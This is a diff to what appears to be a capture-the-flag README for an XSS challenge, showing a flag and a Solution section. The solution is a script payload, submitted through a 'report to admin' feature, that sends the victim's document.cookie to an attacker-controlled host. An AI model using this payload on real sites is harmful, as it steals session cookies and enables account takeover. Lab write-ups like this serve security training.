@@ -22,9 +22,8 @@ derp{E451357_xSS_3v3r}
 ```
 
 ### Files:
-```
 [docker](xss-site-1)
-```
+
 ### Solution:
 ```
 Report to admin feature: <script>document.write('<img src="http://10.YY.XX.2:9000/collect.gif?cookie=' + document.cookie + '" />');</script>
